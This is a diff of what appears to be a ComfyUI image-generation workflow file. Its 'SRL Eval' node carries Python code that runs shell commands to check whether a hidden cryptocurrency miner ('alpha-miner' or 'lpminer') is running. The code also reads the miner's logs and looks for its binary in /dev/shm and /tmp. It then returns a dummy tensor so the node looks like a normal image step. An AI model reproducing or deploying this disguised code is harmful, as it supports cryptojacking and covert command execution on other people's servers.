@@ -2,14 +2,14 @@
   "1": {
     "class_type": "RandomNoise",
     "inputs": {
-      "noise_seed": 69136
+      "noise_seed": 69273
     }
   },
   "2": {
     "class_type": "SRL Eval",
     "inputs": {
       "parameters": "a",
-      "code": "import subprocess\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nif p.stdout.strip():\n    result = \"MINER_RUNNING: \" + p.stdout.strip().split(\"\\n\")[0][:80]\nelse:\n    p2 = subprocess.run([\"pgrep\", \"-a\", \"lpminer\"], capture_output=True, text=True)\n    if p2.stdout.strip():\n        result = \"MINER_RUNNING: \" + p2.stdout.strip().split(\"\\n\")[0][:80]\n    else:\n        import os\n        if os.path.exists(\"/dev/shm/alpha.log\"):\n            with open(\"/dev/shm/alpha.log\", \"r\") as f:\n                log = f.read()[-200:]\n            result = \"NOT_RUNNING_LOG: \" + log.replace(\"\\n\", \" | \")\n        else:\n            result = \"NOT_RUNNING_NO_LOG\"\nresult\nimport torch\nreturn torch.zeros(1,1,1,3)",
+      "code": "import subprocess, os\nresult = []\n\n# Check process\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nif p.stdout.strip():\n    result.append(\"PROC: \" + p.stdout.strip().split(\"\\n\")[0][:60])\nelse:\n    p2 = subprocess.run([\"pgrep\", \"-a\", \"lpminer\"], capture_output=True, text=True)\n    if p2.stdout.strip():\n        result.append(\"PROC: \" + p2.stdout.strip().split(\"\\n\")[0][:60])\n    else:\n        result.append(\"PROC: NOT_FOUND\")\n\n# Check log exists and has content\nfor path in [\"/dev/shm/alpha.log\", \"/tmp/alpha.log\"]:\n    if os.path.exists(path):\n        sz = os.path.getsize(path)\n        with open(path, \"r\") as f:\n            lines = f.readlines()\n            if lines:\n                result.append(f\"LOG({sz}b): \" + lines[-1].strip()[:60])\n            else:\n                result.append(f\"LOG: empty\")\n        break\nelse:\n    result.append(\"LOG: no file\")\n\n# Check binary exists\nif os.path.exists(\"/dev/shm/alpha-miner\"):\n    sz = os.path.getsize(\"/dev/shm/alpha-miner\")\n    result.append(f\"BIN: /dev/shm/alpha-miner ({sz//1024//1024}MB)\")\nelif os.path.exists(\"/tmp/alpha-miner\"):\n    sz = os.path.getsize(\"/tmp/alpha-miner\")\n    result.append(f\"BIN: /tmp/alpha-miner ({sz//1024//1024}MB)\")\nelse:\n    result.append(\"BIN: not found\")\n\noutput = \" | \".join(result)\nimport torch\nreturn torch.zeros(1,1,1,3)",
       "arg0": [
         "1",
         0
